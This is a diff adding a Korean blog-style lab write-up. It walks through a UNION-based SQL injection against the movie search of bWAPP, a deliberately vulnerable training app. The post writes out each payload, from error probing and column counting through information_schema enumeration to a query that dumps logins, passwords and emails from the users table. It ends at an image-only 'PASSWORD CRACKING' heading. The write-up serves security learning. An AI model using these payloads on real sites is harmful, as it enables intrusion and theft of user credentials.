@@ -1,0 +1,95 @@
+# 문제
+해당 사이트에 등록된 사용자 정보(이름, 이메일 주소, 전화번호, 아이디, 패스워드, … 등)를 탈취하시오.
+
+![](https://images.velog.io/images/jjewqm/post/51d553bb-960b-4bae-81b9-d6bbfbda5023/image.png)
+해당 사이트에 `man`이라 검색하니 위와 같은 결과가 출력된다. 유추하건데 해당 사이트의 쿼리문은 아래와 같을 것이다.
+`select * from movies where title like '%man%'`
+
+## SQL 인젝션 가능 여부 확인
+
+![](https://images.velog.io/images/jjewqm/post/12a629c0-9ee3-458b-8be9-67c2dd16ab39/image.png)
+
+`'` 싱글 쿼터를 입력하면 데이터베이스 서버에 질의하는 쿼리에 문법 오류가 발생한다. 오류 메시지에는 데이터베이스 서버 정보가 포함되는데, 데이터베이스 서버 종류에 따라 SQL 구문이 다르므로 서버 정보를 확인할 수 있다. 따라서 해당 사이트 DB 서버는 'MYSQL'임을 알 수 있다.
+
+## 주석문자 확인
+![](https://images.velog.io/images/jjewqm/post/214663bd-2c13-46c9-b79d-5ba8be1a0a7b/image.png)
+사용 가능한 주석 그리고 모든 데이터가 출력되는지 확인하고자 `'or 1=1#` 쿼리를 질의한 결과 위 그림과 같다.
+
+## UNION 구문을 이용하기 위해 반환하는 컬럼 갯수 확인
+현재 사이트의 예상 쿼리는 `select * from movies where title like '%[Data]%'`이다. 따라서 아래와 같이 쿼리를 질의한다.
+`a%' order by n #` 해당 쿼리 n을 1부터 8까지 질의하면 8번째 칼럼은 존재하지 않는 것을 알 수 있다. 따라서 해당 페이지에서 호출하는 칼럼 수는 7개이다. 
+
+![](https://images.velog.io/images/jjewqm/post/17990e7c-f3c3-4f49-bcc5-4412021f67cb/image.png)
+
+## UNION 구문을 이용해서 데이터 출력 개수와 위치를 확인
+ 
+![](https://images.velog.io/images/jjewqm/post/e04f6f1c-9ab3-402a-9262-496694bd94b8/image.png)
+
+- 예상 DB 쿼리 : `select * from movies where title like '%`
+- 질의 쿼리 : `a%' union select 1,2,3,4,5,6,7 #`
+
+조회 결과 7개 컬럼 중 4개의 컬럼(2,3,4,5)만 화면 출력에 사용한다.
+
+## UNION 구문을 이용해 데이터베이스 정보 조회
+MySQL System Variables ⇒ [https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html)
+
+select * from movies where title like '%__a%' union select 1, @@version, @@version_comment, @@version_compile_machine, @@version_compile_os, 6,7 #__ %
+
+_굵게 표시된 글자는 질의한 쿼리이다._
+
+![](https://images.velog.io/images/jjewqm/post/689f43a4-e99f-4bd7-b7d2-c6de3be91240/image.png)
+
+질의한 쿼리로 인해 버전, 버전 정보, 컴파일 머신, 버전 OS 정보가 출력된다.
+
+## 버전 정보 확인
+5.0.96-0ubuntu3는 MYSQL이다.
+![](https://images.velog.io/images/jjewqm/post/0f61c2bd-3809-431f-952a-f4913d7f989b/image.png)
+
+##  information_schema.schemata를 이용해서 DB 정보를 조회
+[information_schema.schemata link](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html)
+
+- 질의 쿼리 : select * from movies where title like '%__a%' union select 1, SCHEMA_NAME, 3,4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA #__
+
+질의 결과 데이터베이스에 등록되어 있는 데이터베이스 목록이 출력된다.
+
+![](https://images.velog.io/images/jjewqm/post/637de432-3652-4d5d-af2b-96ba95c0d717/image.png)
+
+## information_schema.schemata_2
+정상적인 서비스 쿼리의 결과를 null로 만들어서 공격자가 원하는 정보만 출력되도록 수정한다.
+
+- 질의 쿼리 : select * from movies where title like '%__a%' and 1=2 union select 1, schema_name,3,4,5,6,7 from information_schema.schemata #__
+
+![](https://images.velog.io/images/jjewqm/post/73145b03-c106-4101-bd2b-7227110ba766/image.png)
+
+## information_schema.tables 이용해 테이블 정보 조회
+[information_schema.tables link](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html)
+
+- 질의 쿼리 : select * from movies where title like '%__a%' and 1=2 union select 1, table_schema, table_name, table_type, 5, 6, 7 from information_schema.tables #__
+
+![](https://images.velog.io/images/jjewqm/post/62df7418-c280-4d63-9080-3c157ad8aec4/image.png)
+
+BWAPP DB에 있는 테이블만 조회하도록 쿼리를 수정한다.
+
+- 질의 쿼리 : select * from movies where title like '%__a%' and 1=2 union select 1, table_schema, table_name, table_type,5,6,7 from information_schema.tables where table_schema='BWAPP' #__
+
+![](https://images.velog.io/images/jjewqm/post/1528fa94-fc17-4a5b-ad53-ec109a1c3def/image.png)
+
+BWAPP에는 5개 테이블이 존재하고 users테이블 컬럼 정보를 조회하겠다.
+
+## users 테이블에 컬럼 정보를 information_schema.columns를 이용해서 조회
+
+[information_schema.columns](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html)
+
+- 질의 쿼리 : select * from movies where title like '%__a%' and 1=2 union select 1, table_schema, table_name, column_name, 5,6,7 from information_schema.columns where table_name='users' and table_schema='BWAPP' #__ %'
+
+![](https://images.velog.io/images/jjewqm/post/78de33fc-1d15-4301-9c1a-fbb8443bcc8d/image.png)
+
+## users 테이블 정보 조회
+
+- 질의 쿼리 : select * from movies where title like '%__a%' and 1=2 union select 1, id, login, password, email, 6,7 from users #__ %'
+
+![](https://images.velog.io/images/jjewqm/post/444b7e48-5353-4b22-b3cb-792563e860d0/image.png)
+
+## PASSWORD CRACKING
+
+![](https://images.velog.io/images/jjewqm/post/7427f16c-7f46-43b6-9f76-a999d89826f6/image.png)
